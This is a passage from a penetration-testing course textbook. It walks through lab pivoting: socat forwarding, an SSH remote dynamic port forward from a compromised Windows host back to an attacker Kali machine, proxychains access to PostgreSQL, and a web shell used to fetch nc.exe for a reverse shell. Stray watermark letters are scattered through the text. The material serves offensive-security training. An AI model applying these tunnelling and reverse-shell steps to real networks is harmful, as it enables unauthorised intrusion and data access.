tool that turns an SSH connection into something similar to a VPN by setting up local routes that
force traffic through the SSH tunnel. However, it requires root privileges on the SSH client and
Python3 on the SSH server, so it’s not always the most lightweight option. In the appropriate
scenario, however, it can be very useful.
In our lab environment, we have SSH access to PGDATABASE01, which we can access through a
port forward set up on CONFLUENCE01. Let’s run sshuttle through this to observe its capabilities.
First, we can set up a port forward in a shell on CONFLUENCE01, listening on port 2222 on the
WAN interface and forwarding to port 22 on PGDATABASE01.
924 (sshuttle, 2022), https://github.com/sshuttle/sshuttle
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 596
Made in Morocco
Penetration Testing with Kali Linux
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork
TCP:10.4.50.215:22
where ssh
C:\Windows\System32\OpenSSH\ssh.exe
C:\Users\rdp_admin>
Listing 559 - Finding ssh.exe on MULTISERVER03.
Success! We found ssh.exe on this machine.
Notably, the version of OpenSSH bundled with Windows is higher than 7.6, meaning we can use it
for remote dynamic port forwarding.
C:\Users\rdp_admin>ssh.exe -V
OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
Listing 560 - The version of OpenSSH client that is bundled with Windows is higher than 7.6.
We can now create a remote dynamic port forward to our Kali machine, just as we did earlier.
y
We’ll pass the port 9998 to -R and authenticate as kali back on our Kali machine.
k
C:\Users\rdp_admin>ssh -N -R 9998 kali@192.168.118.4
The authenticity of host '192.168.118.4 (192.168.118.4)' can't be established.
ECDSA key fingerprint is SHA256:OaapT7zLp99RmHhoXfbV6JX/IsIh7HjVZyfBfElMFn0.
s
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.118.4' (ECDSA) to the list of known hosts.
kali@192.168.118.4's password: o
Listing 561 - Connecting back to our Kali machine to open the remote dynamic port forward.
We can check that the SOCKS proxy port isn opened on our Kali machine using ss.
kali@kali:~$ ss -ntplu
Netid State Recv-Q i Send-Q Local Address:Port
Peer Address:Port Process z
tcp LISTEN 0 128 127.0.0.1:9998
0.0.0.0:*
D
tcp LISTEN 0 128 0.0.0.0:22
0.0.0.0:*
tcp LISTEN 0 128 [::1]:9998
[::]:*
tcp LISTEN 0 128 [::]:22
[::]:*
Listing 562 - Checking for the open SOCKS port on our Kali machine with ss.
Let’s update /etc/proxychains4.conf to use this socket.
kali@kali:~$ tail /etc/proxychains4.conf
# proxy types: http, socks4, socks5, raw
# * raw: The traffic is simply forwarded to the proxy without modification.
# ( auth types supported: "basic"-http "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9998
Listing 563 - Proxychains configuration file having been edited.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 600
Made in Morocco
Penetration Testing with Kali Linux
Now that the configuration file is pointing at our remote dynamic port forward SOCKS port, we
can run psql through proxychains to connect to the PostgreSQL database as the postgres user.
We’ll use the same psql command we would as if connecting directly from MULTISERVER03.
kali@kali:~$ proxychains psql -h 10.4.50.215 -U postgres
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.215:5432 ... OK
Password for user postgres:
[proxychains] Strict chain ... 127.0.0.1:9998 ... 10.4.50.215:5432 ... OK
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256,
compression: off)
Type "help" for help. y
postgres=# \l
k
List of databases
Name | Owner | Encoding | Collate | Ctype | Access privileges
------------+----------+----------+-------------+-s------------+-----------------------
confluence | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 |
postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 |
template0 | postgres | UTF8 | en_US.UTFo-8 | en_US.UTF-8 | =c/postgres +
| | | | | postgres=CTc/postgres
template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres +
n
| | | | | postgres=CTc/postgres
(4 rows)
i
postgres=#
z
Listing 564 - Connecting to the PostgreSQL server with psql and Proxychains.
The connection was a success! We’re now interacting with the PostgreSQL database on
D
PGDATABASE01 through an SSH remote dynamic port forward initiated from the OpenSSH client
running on a Windows Server 2022 machine.
In this section, we’ve set up a connection to a PostgreSQL database running on a Linux server
through an SSH remote dynamic port forward made between a Windows SSH client and our Kali
machine SSH server.
18.4.2 Plink
Administrators may want to avoid leaving OpenSSH on their Windows machines, so we’re not
guaranteed to discover an OpenSSH client. Even if we find ourselves on a recent version of
Windows, the network administrators may have removed it.
Nevertheless, network administrators still need remote administration tools. Most networks have
SSH servers running somewhere, and administrators need tools to connect to these servers from
Windows hosts. Before OpenSSH was so readily available on Windows, most network
administrators’ tools of choice were PuTTY928 and its command-line-only counterpart, Plink.929
928 (PuTTY, 2022), https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
929 (Simon Tatham, 2002), https://tartarus.org/~simon/putty-snapshots/htmldoc/Chapter7.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 601
Made in Morocco
Penetration Testing with Kali Linux
One of the benefits of using tools that are popular with network administrators is that they will
rarely be flagged by traditional antivirus software. This makes them appealing to attackers, since
using them is relatively covert compared to more security-adjacent tools with similar
functionality.
We’ll use Plink in this section, since in a security assessment, we will more likely have a shell than
GUI access. The Plink manual930 explains that much of the functionality the OpenSSH client offers
is also built into Plink (although one notable feature Plink doesn’t have is remote dynamic port
forwarding).
Many 3rd-party SSH clients for Windows provide port forwarding features. We’re
using Plink in this case because it’s common, lightweight, and specifically
designed to run on the command line.
y
k
Let’s get familiar with Plink by using it in the lab in a revised scenario. In this scenario, we find that
MULTISERVER03 now has a web application on TCP port 80 exposed. All other inbound ports are
blocked by a firewall, so RDP is no longer available eithser. The layout is much like the following
diagram:
o
n
i
z
D
Figure 254: MULTISERVER03 behind a firewall, with only port 80 exposed
We can compromise MULTISERVER03 through the web application, drop a web shell on it, and
gain a reverse shell using that. We have previously found credentials we could use to connect to
the RDP service. This is blocked by the firewall, so we can’t connect directly. The OpenSSH client
has also been removed, so we can’t create a remote port forward using that.
However, we have another option: we can create a remote port forward using Plink.
Let’s try this out. First, we will get an interactive reverse shell from MULTISERVER03. From our
initial exploitation, we uploaded a basic web shell at /umbraco/forms.aspx. We can browse to this
930 (Simon Tatham, 2002), https://tartarus.org/~simon/putty-snapshots/htmldoc/Chapter7.html
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 602
Made in Morocco
Penetration Testing with Kali Linux
URL and run whatever Windows commands we want - these will be run as the iis
apppool\defaultapppool user. We can use this web shell to download nc.exe to MULTISERVER03,
which we will then use to send a reverse shell back to our Kali machine.
MULTISERVER03 is already “pre-compromised” in the lab. At this point, you can
browse to /umbraco/forms.aspx on the HTTP server on port 80 on
MULTISERVER03. You should see a webshell page, which will let you run
arbitrary commands on MULTISERVER03.
To download nc.exe onto MULTISERVER03, we first need to host it on a server that
MULTISERVER03 can access. We can easily configure Apache2 on our Kali machine to do this.
Apache2 is installed by default on Kali, so we just need to start the apyache2 service.
kali@kali:~$ sudo systemctl start apache2
k
[sudo] password for kali:
kali@kali:~$ s
Listing 565 - Starting Apache2.
We can then find nc.exe from our Kali windows-oresources/binaries directory and copy it to the